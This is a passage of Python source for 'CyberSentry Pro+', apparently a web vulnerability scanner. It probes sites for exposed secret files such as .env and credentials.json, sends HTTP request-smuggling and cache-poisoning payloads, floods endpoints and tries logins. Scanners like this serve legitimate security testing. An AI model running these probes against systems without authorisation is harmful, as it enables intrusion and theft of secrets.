                        "type": "Weak CSRF Token",
                        "element": str(form)[:100] + "...",
                        "severity": "Medium",
                        "exploit": "Token prediction or brute-force",
                        "confidence": "Low"
                    })
        
        return vulnerabilities

    def check_directory_listing(self):
        """Check for directory listing vulnerabilities with common directories"""
        vulnerabilities = []
        directories = [
            "images/", "img/", "assets/", "uploads/", "docs/", "backup/",
            "admin/", "wp-admin/", "wp-content/", "log/", "tmp/", "data/",
            "config/", "database/", "backups/", "old/", "test/"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_dir = {executor.submit(self.check_directory, dir): dir for dir in directories}
            for future in concurrent.futures.as_completed(future_to_dir):
                dir = future_to_dir[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    pass
        
        return vulnerabilities

    def check_directory(self, directory):
        """Check a single directory for listing vulnerability"""
        test_url = urljoin(self.target_url, directory)
        response = self.session.get(test_url)
        
        if response.status_code == 200:
            if "Index of /" in response.text or "<title>Directory listing for /" in response.text:
                return {
                    "type": "Directory Listing Enabled",
                    "path": directory,
                    "severity": "Low",
                    "exploit": "Browse sensitive files",
                    "confidence": "High"
                }
        return None

    def find_subdomains(self):
        """Find subdomains using common DNS records"""
        domain = urlparse(self.target_url).netloc
        base_domain = '.'.join(domain.split('.')[-2:])
        subdomains = [
            "www", "mail", "webmail", "admin", "dashboard", 
            "test", "dev", "staging", "api", "secure",
            "app", "portal", "blog", "shop", "store"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_sub = {executor.submit(self.check_subdomain, f"{sub}.{base_domain}"): sub for sub in subdomains}
            for future in concurrent.futures.as_completed(future_to_sub):
                sub = future_to_sub[future]
                try:
                    result = future.result()
                    if result:
                        self.results['subdomains'].append(result)
                except Exception as e:
                    pass

    def check_subdomain(self, subdomain):
        """Check if a subdomain exists"""
        try:
            socket.gethostbyname(subdomain)
            return subdomain
        except:
            return None

    def check_sensitive_files(self):
        """Check for common sensitive files and directories"""
        sensitive_paths = [
            "/.git/config",
            "/.env",
            "/.htaccess",
            "/.htpasswd",
            "/web.config",
            "/phpinfo.php",
            "/server-status",
            "/admin/config.yml",
            "/backup.zip",
            "/database.sql",
            "/robots.txt",
            "/sitemap.xml",
            "/crossdomain.xml",
            "/client_secrets.json",
            "/credentials.json",
            "/config.json"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_path = {executor.submit(self.check_sensitive_file, path): path for path in sensitive_paths}
            for future in concurrent.futures.as_completed(future_to_path):
                path = future_to_path[future]
                try:
                    result = future.result()
                    if result:
                        self.results['sensitive_files'].append(result)
                except:
                    pass

    def check_sensitive_file(self, path):
        """Check a single sensitive file"""
        test_url = urljoin(self.target_url, path)
        response = self.session.get(test_url)
        
        if response.status_code == 200:
            sensitive_keywords = ["password", "secret", "key", "database", "user", "admin"]
            if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                return {
                    "path": path,
                    "status": "FOUND",
                    "severity": "Critical",
                    "content_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                }
            return {
                "path": path,
                "status": "FOUND",
                "severity": "Medium",
                "content_length": len(response.text)
            }
        return None

    def find_api_endpoints(self):
        """Find API endpoints using common patterns"""
        api_patterns = [
            "/api/",
            "/graphql",
            "/rest/",
            "/v1/",
            "/v2/",
            "/oauth/",
            "/auth/",
            "/token",
            "/user",
            "/users",
            "/admin",
            "/swagger.json",
            "/openapi.json",
            "/wsdl",
            "/soap"
        ]
        
        # Check common API paths
        for pattern in api_patterns:
            test_url = urljoin(self.target_url, pattern)
            try:
                response = self.session.get(test_url)
                if response.status_code < 400:
                    self.results['api_endpoints'].append({
                        "url": test_url,
                        "status": response.status_code,
                        "content_type": response.headers.get('Content-Type', '')
                    })
            except:
                pass

    def check_api_security(self):
        """Check common API security issues"""
        vulnerabilities = []
        
        for api in self.results['api_endpoints']:
            # Check for missing authentication
            try:
                response = self.session.get(api['url'])
                if response.status_code == 200 and "admin" in api['url']:
                    vulnerabilities.append({
                        "type": "API: Missing Authentication",
                        "endpoint": api['url'],
                        "severity": "Critical",
                        "confidence": "Medium"
                    })
                
                # Check for excessive data exposure
                if response.status_code == 200 and ("password" in response.text or "token" in response.text):
                    vulnerabilities.append({
                        "type": "API: Excessive Data Exposure",
                        "endpoint": api['url'],
                        "severity": "High",
                        "confidence": "Medium"
                    })
                
                # Check for broken object level authorization (BOLA)
                if "/users/" in api['url']:
                    test_url = api['url'].replace("/users/1", "/users/2")
                    test_response = self.session.get(test_url)
                    if test_response.status_code == 200:
                        vulnerabilities.append({
                            "type": "API: Broken Object Level Authorization",
                            "endpoint": api['url'],
                            "severity": "High",
                            "confidence": "Medium"
                        })
                
                # Check GraphQL introspection
                if "graphql" in api['url']:
                    graphql_payload = {"query": "{__schema{types{name}}}"}
                    try:
                        response = self.session.post(api['url'], json=graphql_payload)
                        if "__schema" in response.text:
                            vulnerabilities.append({
                                "type": "API: GraphQL Introspection Enabled",
                                "endpoint": api['url'],
                                "severity": "Medium",
                                "confidence": "High"
                            })
                    except:
                        pass
                    
            except:
                continue
        
        self.results['vulnerabilities'].extend(vulnerabilities)

    def check_cache_poisoning(self):
        """Detect web cache poisoning vulnerabilities"""
        vulnerabilities = []
        cache_headers = ["X-Cache", "X-Cache-Hits", "CF-Cache-Status", "Age"]
        
        # Create a unique payload
        unique_payload = ''.join(random.choices(string.ascii_letters, k=10))
        headers = {"X-Forwarded-Host": unique_payload}
        
        try:
            # First request to poison cache
            response1 = self.session.get(self.target_url, headers=headers)
            
            # Second request to check if poisoned
            response2 = self.session.get(self.target_url)
            
            # Check if payload appears in second response
            if unique_payload in response2.text:
                vulnerabilities.append({
                    "type": "Web Cache Poisoning",
                    "severity": "High",
                    "confidence": "Medium"
                })
            
            # Check cache headers
            cache_indicators = []
            for header in cache_headers:
                if header in response2.headers:
                    cache_indicators.append(f"{header}: {response2.headers[header]}")
            
            if cache_indicators:
                vulnerabilities.append({
                    "type": "Cache Headers Detected",
                    "severity": "Info",
                    "headers": cache_indicators,
                    "confidence": "High"
                })
                
        except:
            pass
        
        return vulnerabilities

    def check_http_request_smuggling(self):
        """Detect HTTP Request Smuggling vulnerabilities"""
        vulnerabilities = []
        smuggling_payloads = [
            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "GET / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
        ]
        
        parsed = urlparse(self.target_url)
        host = parsed.netloc
        
        for payload_template in smuggling_payloads:
            payload = payload_template.format(host=host)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, 80))
                s.sendall(payload.encode())
                response = s.recv(4096).decode()
                s.close()
                
                if "HTTP/1.1 400" in response or "Unrecognized method" in response:
                    vulnerabilities.append({
                        "type": "HTTP Request Smuggling (CL.TE)",
                        "severity": "Critical",
                        "confidence": "Medium"
                    })
                    break
                    
            except:
                continue
        
        return vulnerabilities

    def check_rate_limiting(self):
        """Test for rate limiting vulnerabilities"""
        vulnerabilities = []
        test_endpoints = [self.target_url] + self.results['endpoints'][:5]  # Test first 5 endpoints
        
        for endpoint in test_endpoints:
            try:
                # Baseline request
                baseline_response = self.session.get(endpoint)
                baseline_time = baseline_response.elapsed.total_seconds()
                
                # Flood requests
                start_time = time.time()
                for _ in range(50):
                    self.session.get(endpoint)
                
                flood_time = time.time() - start_time
                
                # If flood time is similar to baseline, no rate limiting
                if flood_time < baseline_time * 10:  # Threshold
                    vulnerabilities.append({
                        "type": "Rate Limiting Bypass",
                        "endpoint": endpoint,
                        "severity": "Medium",
                        "confidence": "Medium"
                    })
            except:
                continue
        
        return vulnerabilities

    def check_clickjacking(self):
        """Check for clickjacking vulnerabilities"""
        vulnerabilities = []
        for endpoint in [self.target_url] + self.results['endpoints'][:10]:
            try:
                response = self.session.get(endpoint)
                headers = response.headers
                
                # Check X-Frame-Options
                x_frame = headers.get('X-Frame-Options', '').lower()
                if not x_frame or 'allow-from' in x_frame:
                    vulnerabilities.append({
                        "type": "Clickjacking",
                        "endpoint": endpoint,
                        "severity": "Medium",
                        "confidence": "High"
                    })
                
                # Check Content-Security-Policy frame-ancestors
                csp = headers.get('Content-Security-Policy', '').lower()
                if 'frame-ancestors' not in csp:
                    vulnerabilities.append({
                        "type": "Clickjacking (Missing frame-ancestors)",
                        "endpoint": endpoint,
                        "severity": "Medium",
                        "confidence": "Medium"
                    })
            except:
                continue
        
        return vulnerabilities

    def check_http_methods(self):
        """Check for dangerous HTTP methods"""
        vulnerabilities = []
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        
        for endpoint in [self.target_url] + self.results['endpoints'][:10]:
            try:
                response = self.session.options(endpoint)
                allowed_methods = response.headers.get('Allow', '')
                
                for method in dangerous_methods:
                    if method in allowed_methods:
                        vulnerabilities.append({
                            "type": "Dangerous HTTP Method",
                            "method": method,
                            "endpoint": endpoint,
                            "severity": "Medium",
                            "confidence": "High"
                        })
            except:
                continue
        
        return vulnerabilities

    def check_websockets(self):
        """Check for insecure WebSocket implementations"""
        vulnerabilities = []
        ws_endpoints = []
        
        # Find WebSocket endpoints
        for endpoint in self.results['endpoints']:
            if endpoint.startswith('ws://') or 'websocket' in endpoint.lower():
                ws_endpoints.append(endpoint)
        
        for endpoint in ws_endpoints:
            # Check for unencrypted WebSockets
            if endpoint.startswith('ws://'):
                vulnerabilities.append({
                    "type": "Insecure WebSocket (ws://)",
                    "endpoint": endpoint,
                    "severity": "Medium",
                    "confidence": "High"
                })
            
            # Check for authentication
            try:
                response = self.session.get(endpoint.replace('ws://', 'http://').replace('wss://', 'https://'))
                if response.status_code == 200:
                    vulnerabilities.append({
                        "type": "Unauthenticated WebSocket",
                        "endpoint": endpoint,
                        "severity": "High",
                        "confidence": "Medium"
                    })
            except:
                continue
        
        return vulnerabilities

    def check_sensitive_data_exposure(self):
        """Check for sensitive data exposure in responses"""
        vulnerabilities = []
        sensitive_patterns = {
            "credit_card": r"\b(?:\d[ -]*?){13,16}\b",
            "ssn": r"\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b",
            "api_key": r"\b[a-f0-9]{32}\b|\b[a-f0-9]{40}\b|\b[a-f0-9]{64}\b",
            "password": r"password\s*=\s*['\"]?([^'\">\s]+)",
            "jwt": r"\bey[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\b"
        }
        
        for endpoint in self.results['endpoints'][:50]:  # Check first 50 endpoints
            try:
                response = self.session.get(endpoint)
                content = response.text
                
                for data_type, pattern in sensitive_patterns.items():
                    matches = re.findall(pattern, content)
                    if matches:
                        vulnerabilities.append({
                            "type": "Sensitive Data Exposure",
                            "data_type": data_type,
                            "endpoint": endpoint,
                            "severity": "Critical",
                            "matches_found": len(matches),
                            "confidence": "High"
                        })
            except:
                continue
        
        return vulnerabilities

    def check_logout_functionality(self):
        """Check if logout functionality properly invalidates sessions"""
        vulnerabilities = []
        logout_endpoints = [url for url in self.results['endpoints'] if 'logout' in url.lower()]
        
        for endpoint in logout_endpoints:
            try:
                # Create authenticated session
                auth_cookies = dict(self.session.cookies)
                
                # Access protected page
                protected_url = urljoin(self.target_url, '/profile')
                protected_response = self.session.get(protected_url)
                if protected_response.status_code != 200:
                    continue
                
                # Perform logout
                self.session.get(endpoint)
                
                # Try accessing protected page again
                post_logout_response = self.session.get(protected_url)
                
                # Restore original session
                self.session.cookies.update(auth_cookies)
                
                # Check if still authenticated
                if post_logout_response.status_code == 200:
                    vulnerabilities.append({
                        "type": "Insecure Logout",
                        "endpoint": endpoint,
                        "severity": "Medium",
                        "confidence": "High"
                    })
            except:
                continue
        
        return vulnerabilities

    def check_brute_force_protection(self):
        """Check for login page brute force protection"""
        vulnerabilities = []
        login_endpoints = [url for url in self.results['endpoints'] if 'login' in url.lower()]
        
        for endpoint in login_endpoints:
            try:
                # Test multiple failed logins
                for i in range(5):
                    response = self.session.post(endpoint, data={
                        'username': f'test{i}',
                        'password': 'wrongpassword'
                    })
                
                # Check if account is locked
                response = self.session.post(endpoint, data={
                    'username': 'testuser',
                    'password': 'validpassword'  # Assume we have one valid credential
                })
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        "type": "Missing Brute Force Protection",
                        "endpoint": endpoint,
                        "severity": "Medium",
                        "confidence": "High"
                    })
            except:
                continue
        
        return vulnerabilities

    def find_api_in_js(self, js_url):
        """Find API endpoints in JavaScript files"""
        api_endpoints = []
        try:
            response = self.session.get(js_url)
            # Look for common API patterns
            patterns = [
                r'["\'](https?://[^"\']+/api/[^"\']+)["\']',
                r'["\'](/api/[^"\']+)["\']',
                r'\.get\(["\'](https?://[^"\']+)["\']',
                r'\.post\(["\'](https?://[^"\']+)["\']',
                r'\.fetch\(["\'](https?://[^"\']+)["\']',
                r'apiUrl\s*:\s*["\'](https?://[^"\']+)["\']'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if not match.startswith('http'):
                        match = urljoin(self.target_url, match)
                    if match not in api_endpoints:
                        api_endpoints.append(match)
        
        except:
            pass
        
        return api_endpoints

    def generate_report(self, format='json'):
        """Generate vulnerability report in specified format"""
        if format == 'json':
            return json.dumps(self.results, indent=2, ensure_ascii=False)
        elif format == 'html':
            # HTML report generation
            html_report = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>CyberSentry Pro+ Scan Report</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 40px; }}
                    h1 {{ color: #d32f2f; }}
                    .vuln {{ background-color: #ffebee; padding: 15px; margin-bottom: 10px; border-radius: 5px; }}
                    .critical {{ border-left: 5px solid #d32f2f; }}
                    .high {{ border-left: 5px solid #ff5722; }}
                    .medium {{ border-left: 5px solid #ffc107; }}
                    .low {{ border-left: 5px solid #4caf50; }}
                    .summary {{ background-color: #e3f2fd; padding: 20px; border-radius: 5px; }}
                    table {{ width: 100%; border-collapse: collapse; }}
                    th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                    th {{ background-color: #f5f5f5; }}
                </style>
            </head>
            <body>
                <h1>CyberSentry Pro+ Vulnerability Report</h1>
                <p><strong>Target:</strong> {self.results['target']}</p>
                <p><strong>Scan Duration:</strong> {self.results['scan_duration']:.2f} seconds</p>
                
                <div class="summary">
                    <h2>Scan Summary</h2>
                    <p><strong>Vulnerabilities Found:</strong> {len(self.results['vulnerabilities'])}</p>
                    <p><strong>Endpoints Discovered:</strong> {len(self.results['endpoints'])}</p>
                    <p><strong>Subdomains Found:</strong> {len(self.results['subdomains'])}</p>
                </div>
                
                <h2>Vulnerabilities</h2>
            """
            
            # Group vulnerabilities by severity
            vuln_by_severity = {"Critical": [], "High": [], "Medium": [], "Low": []}
            for vuln in self.results['vulnerabilities']:
                severity = vuln.get('severity', 'Medium')
                vuln_by_severity[severity].append(vuln)
            
            # Display vulnerabilities by severity
            for severity, vulns in vuln_by_severity.items():
                if vulns:
                    html_report += f"<h3>{severity} Severity Issues</h3>"
                    for vuln in vulns:
                        html_report += f"""
                        <div class="vuln {severity.lower()}">
                            <h4>{vuln['type']}</h4>
                            <p><strong>Location:</strong> {vuln.get('endpoint', vuln.get('parameter', 'N/A'))}</p>
                            <p><strong>Confidence:</strong> {vuln.get('confidence', 'Medium')}</p>
                            <p><strong>Details:</strong> {vuln.get('exploit', vuln.get('payload', 'No additional details'))}</p>
                        </div>
                        """
            
            # Security headers
            html_report += "<h2>Security Headers</h2><table><tr><th>Header</th><th>Status</th><th>Value</th></tr>"
            for header, info in self.results['security_headers'].items():
                status = info['status']
                status_color = "green" if status == "PRESENT" else "red"
                html_report += f"<tr><td>{header}</td><td style='color:{status_color}'>{status}</td><td>{info.get('value', '')}</td></tr>"
            html_report += "</table>"
            
            # Server information
            html_report += "<h2>Server Information</h2><table>"
            for key, value in self.results['server_info'].items():
                html_report += f"<tr><td><strong>{key}</strong></td><td>{value}</td></tr>"
            html_report += "</table>"
            
            html_report += "</body></html>"
            return html_report
        else:
            return "Unsupported report format"

def print_banner():
    """Print enhanced tool banner"""
    banner = f"""
{Fore.RED}
███████╗██╗  ██╗██████╗ ███████╗██████╗     ██████╗  ██████╗ ██████╗ 
██╔════╝╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔═══██╗██╔══██╗
█████╗   ╚███╔╝ ██████╔╝█████╗  ██████╔╝    ██████╔╝██║   ██║██████╔╝
██╔══╝   ██╔██╗ ██╔═══╝ ██╔══╝  ██╔══██╗    ██╔═══╝ ██║   ██║██╔═══╝ 
███████╗██╔╝ ██╗██║     ███████╗██║  ██║    ██║     ╚██████╔╝██║     
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝     
                                                                       
{Style.RESET_ALL}{Fore.CYAN}
CyberSentry Pro+ - Advanced Web Vulnerability Scanner
Rebel Genius Collective | 0x7a6 | {time.strftime("%Y")}
{Style.RESET_ALL}
{Fore.YELLOW}Features:{Style.RESET_ALL}
• 30+ Vulnerability Checks • DNS Reconnaissance • JWT Security
• API Security Testing • Compression Analysis • Performance Metrics
• Multi-threaded Scanning • Comprehensive Reporting
"""
    print(banner)

if __name__ == '__main__':
    start_time = time.time()
    print_banner()
    
    parser = argparse.ArgumentParser(description='CyberSentry Pro+ - Advanced Web Vulnerability Scanner')
    parser.add_argument('target', help='URL of the target website')
    parser.add_argument('--output', '-o', default='json', choices=['json', 'html'], help='Output format')
    parser.add_argument('--threads', '-t', type=int, default=20, help='Number of threads')
    parser.add_argument('--proxy', '-p', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--auth', help='Basic authentication (username:password)')
    parser.add_argument('--cookies', help='Cookies in name=value format (multiple separated by ;)')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    args = parser.parse_args()
    
    # Parse authentication
    auth = None
    if args.auth:
        username, password = args.auth.split(':')
        auth = {'username': username, 'password': password}
    
    # Parse cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()
    
    print(f"{Fore.YELLOW}[*] Starting scan of {args.target} with {args.threads} threads...{Style.RESET_ALL}")
    
    scanner = VulnerabilityScanner(
        args.target,
        threads=args.threads,
        proxy=args.proxy,
        auth=auth,
        cookies=cookies,
        timeout=args.timeout,
        verbose=args.verbose
    )
    scan_results = scanner.scan()
    scan_duration = scan_results.get('scan_duration', 0)
    
    print(f"\n{Fore.GREEN}=== SCAN COMPLETED IN {scan_duration:.2f} SECONDS ==={Style.RESET_ALL}")
    
    # Print summary
    vuln_count = len(scan_results.get('vulnerabilities', []))
    severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
    
    for vuln in scan_results.get('vulnerabilities', []):
        severity = vuln.get('severity', 'Medium')
        severity_counts[severity] += 1
    
    print(f"\n{Fore.RED}Vulnerability Summary:{Style.RESET_ALL}")
    print(f"Critical: {severity_counts['Critical']} | High: {severity_counts['High']} | Medium: {severity_counts['Medium']} | Low: {severity_counts['Low']}")
    
    # Print top findings
    if vuln_count > 0:
        print(f"\n{Fore.RED}Top Findings:{Style.RESET_ALL}")
        for vuln in scan_results['vulnerabilities'][:5]:
            print(f"• [{vuln['severity']}] {vuln['type']} ({vuln.get('endpoint', vuln.get('parameter', ''))})")
    
    # Save report to file
    report_filename = f"scan_report_{time.strftime('%Y%m%d_%H%M%S')}.{args.output}"
    with open(report_filename, 'w', encoding='utf-8') as f:
        f.write(scanner.generate_report(args.output))
    
    print(f"{Fore.GREEN}[*] Report saved to {report_filename}{Style.RESET_ALL}")